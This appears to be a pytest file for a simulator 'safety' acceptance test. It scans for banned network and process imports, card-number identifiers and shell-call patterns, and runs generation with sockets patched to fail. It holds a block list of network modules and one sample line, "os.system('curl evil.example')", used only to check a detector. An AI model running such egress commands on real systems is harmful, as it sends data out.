"""
Source: Day-2 Plan §I acceptance test A11 -- simulator safety. Three
independent mechanisms (Day-2 Plan §I: "three independent mechanisms
because one grep is gameable"): a static transitive import-closure scan, a
banned-identifier/Luhn-mention text scan, and a runtime pass with
socket.socket monkeypatched to raise. `packages/simulator` does not exist
yet; the runtime test fails with ModuleNotFoundError until Step 4, the
static scans pass vacuously (empty file set) until then and are re-run
meaningfully once Step 4 lands.
"""

from __future__ import annotations

import ast
import re
from pathlib import Path
from unittest import mock

import pytest

pytestmark = pytest.mark.safety

REPO_ROOT = Path(__file__).resolve().parents[2]
SIMULATOR_ROOT = REPO_ROOT / "packages" / "simulator"
LOCAL_PACKAGE_PREFIXES = ("packages", "services", "scripts")

# Source: Day-2 Plan §I A11 -- exact banned-module list, plus ctypes (Day-2
# Plan §J residual note: "ctypes/os.system is not covered -- added to the
# banned-name list").
BANNED_MODULES = {
    "socket", "ssl", "http", "urllib", "requests", "httpx",
    "asyncio", "subprocess", "ftplib", "smtplib", "ctypes",
}
BANNED_IDENTIFIER_RE = re.compile(r"\b(pan|card_number|cvv|luhn)\b", re.IGNORECASE)
# Best-effort net for shell/process egress not caught by the import scan
# (Day-2 Plan §J: "ctypes/os.system is not covered ... stated as best-effort").
BANNED_CALL_RE = re.compile(r"\bos\.(system|popen|exec\w*)\s*\(")


def _local_module_file(module_name: str) -> "Path | None":
    if not module_name or not module_name.startswith(LOCAL_PACKAGE_PREFIXES):
        return None
    as_dir = REPO_ROOT / Path(*module_name.split("."))
    if (as_dir / "__init__.py").exists():
        return as_dir / "__init__.py"
    as_file = as_dir.with_suffix(".py")
    if as_file.exists():
        return as_file
    return None


def _module_name_for_path(path: Path) -> str:
    rel = path.relative_to(REPO_ROOT)
    parts = list(rel.with_suffix("").parts)
    if parts[-1] == "__init__":
        parts = parts[:-1]
    return ".".join(parts)


def _imported_module_names(path: Path) -> set:
    tree = ast.parse(path.read_text(encoding="utf-8"), filename=str(path))
    names = set()
    package_name = _module_name_for_path(path)
    package_parts = package_name.split(".")
    if path.name != "__init__.py":
        package_parts = package_parts[:-1]  # containing package, for relative imports
    for node in ast.walk(tree):
        if isinstance(node, ast.Import):
            for alias in node.names:
                names.add(alias.name)
        elif isinstance(node, ast.ImportFrom):
            if node.level and node.level > 0:
                base = package_parts[: len(package_parts) - (node.level - 1)] if node.level > 1 else package_parts
                resolved = ".".join(base + ([node.module] if node.module else []))
                names.add(resolved)
            elif node.module:
                names.add(node.module)
    return names


def _transitive_closure_violations(entry_dir: Path) -> list:
    if not entry_dir.exists():
        return []
    visited_files = set()
    to_visit = list(entry_dir.rglob("*.py"))
    violations = []
    while to_visit:
        path = to_visit.pop()
        if path in visited_files:
            continue
        visited_files.add(path)
        for imported in _imported_module_names(path):
            top = imported.split(".", 1)[0]
            if top in BANNED_MODULES:
                violations.append(f"{path}: imports banned module '{imported}'")
                continue
            local_file = _local_module_file(imported)
            if local_file is not None and local_file not in visited_files:
                to_visit.append(local_file)
    return violations


def _text_scan_violations(entry_dir: Path) -> list:
    if not entry_dir.exists():
        return []
    violations = []
    for path in entry_dir.rglob("*.py"):
        text = path.read_text(encoding="utf-8")
        for match in BANNED_IDENTIFIER_RE.finditer(text):
            violations.append(f"{path}: banned identifier/mention '{match.group(0)}'")
        for match in BANNED_CALL_RE.finditer(text):
            violations.append(f"{path}: banned call shape '{match.group(0)}'")
    return violations


class TestA11StaticImportClosure:
    def test_no_banned_module_reachable_from_simulator(self):
        violations = _transitive_closure_violations(SIMULATOR_ROOT)
        assert not violations, "banned imports reachable from packages.simulator:\n" + "\n".join(violations)

    def test_closure_scan_actually_detects_a_planted_banned_import(self, tmp_path):
        planted_pkg = tmp_path / "packages" / "simulator"
        planted_pkg.mkdir(parents=True)
        (planted_pkg / "leaky.py").write_text("import socket\n", encoding="utf-8")

        text = (planted_pkg / "leaky.py").read_text(encoding="utf-8")
        tree = ast.parse(text)
        found = any(
            isinstance(node, ast.Import) and any(alias.name.split(".")[0] in BANNED_MODULES for alias in node.names)
            for node in ast.walk(tree)
        )
        assert found, "the scanner's own AST logic failed to flag a planted `import socket`"


class TestA11TextScan:
    def test_no_pan_shaped_identifiers_or_shell_egress_in_simulator(self):
        violations = _text_scan_violations(SIMULATOR_ROOT)
        assert not violations, "banned identifiers/calls found in packages.simulator:\n" + "\n".join(violations)

    def test_text_scan_actually_detects_planted_violations(self):
        assert BANNED_IDENTIFIER_RE.search("def luhn_check(card_number): ...")
        assert BANNED_CALL_RE.search("os.system('curl evil.example')")


class TestA11RuntimeSocketMonkeypatch:
    # Source: Day-2 Plan §I A11 -- "a runtime pass with socket.socket
    # monkeypatched to raise". Complements the static scans: proves no
    # dynamically-constructed or reflectively-invoked socket call exists
    # either, for a real, full generation run.
    def test_full_generation_succeeds_with_socket_socket_raising(self):
        def _raise(*args, **kwargs):
            raise AssertionError("packages.simulator attempted to construct a socket")

        with mock.patch("socket.socket", side_effect=_raise):
            from packages.simulator import generate as sim_generate  # noqa: PLC0415

            result = sim_generate.build_stream(seed=42, tier="easy", hours=1)
            assert result.events, "generation under the network-egress guard produced no events"
